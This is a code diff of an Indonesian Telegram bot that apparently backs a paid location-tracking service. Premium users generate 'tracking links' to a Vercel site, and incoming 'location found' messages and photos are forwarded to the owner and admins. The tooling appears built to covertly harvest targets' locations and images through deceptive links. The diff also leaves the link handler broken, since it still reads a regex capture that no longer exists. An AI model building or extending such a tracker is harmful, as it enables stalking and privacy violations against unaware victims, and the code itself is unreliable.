@@ -1,7 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 
-// CARA TERHUBUNG: Gunakan require, bukan readFileSync untuk file .js
+// PANGGILAN YANG BENAR: Jangan gunakan JSON.parse(fs.readFileSync) untuk file .js
 const settings = require('./database/settings'); 
 
 const bot = new TelegramBot(settings.token, { polling: true });
@@ -14,6 +14,22 @@ if (!fs.existsSync(PREMIUM_FILE)) fs.writeFileSync(PREMIUM_FILE, JSON.stringify(
 // Fungsi Utilitas
 const isAdmin = (userId) => settings.admins.includes(String(userId)) || String(userId) === settings.ownerId;
 
+// Tambahkan listener ini di lacak.js
+bot.on('message', (msg) => {
+    // Jika pesan mengandung lokasi atau foto dari website
+    if (msg.text && msg.text.includes("LOKASI DITEMUKAN") || msg.photo) {
+        // Teruskan ke Owner
+        bot.forwardMessage(settings.ownerId, msg.chat.id, msg.message_id);
+        
+        // Teruskan ke semua Admin
+        settings.admins.forEach(adminId => {
+            if (adminId !== settings.ownerId) {
+                bot.forwardMessage(adminId, msg.chat.id, msg.message_id);
+            }
+        });
+    }
+});
+
 // Handler: /start (Menampilkan Menu)
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
@@ -24,7 +40,7 @@ Halo *${msg.from.first_name}*!
 Gunakan menu di bawah untuk mengelola fitur.
 
 🛠 **MENU ADMIN:**
-1️⃣ /createlink [nama] - Buat link pelacak
+1️⃣ /createlink - Buat link pelacak
 2️⃣ /addprem [ID] [hari] - Tambah user premium
 
 📊 **STATUS ANDA:**
@@ -49,7 +65,7 @@ bot.onText(/\/addprem (\d+) (\d+)/, (msg, match) => {
 });
 
 // Handler: /createlink
-bot.onText(/\/createlink (.+)/, (msg, match) => {
+bot.onText(/\/createlink/, (msg, match) => {
     const userId = String(msg.from.id);
     const db = JSON.parse(fs.readFileSync(PREMIUM_FILE));
     const isPremium = db[userId] && (db[userId] > Date.now() || db[userId] === "PERMANENT");
@@ -59,10 +75,8 @@ bot.onText(/\/createlink (.+)/, (msg, match) => {
     }
 
     const path = match[1].toLowerCase().replace(/\s+/g, '-');
-    // Link terhubung ke domain Vercel Anda
-    const link = `${settings.baseUrlVercel}/index.html?ref=${userId}&path=${path}`;
 
-    bot.sendMessage(msg.chat.id, `🚀 *LINK BERHASIL DIBUAT*\n\n🔗 Link: \`${link}\`\n👤 Creator: ${msg.from.first_name}`, { parse_mode: "Markdown" });
+    bot.sendMessage(msg.chat.id, `🚀 *LINK BERHASIL DIBUAT*\n\n🔗 Link: \`https://elektronik-phi.vercel.app\`\n👤 Creator: ${msg.from.first_name}`, { parse_mode: "Markdown" });
 });
 
 console.log("✅ Bot Lacak Aktif...");
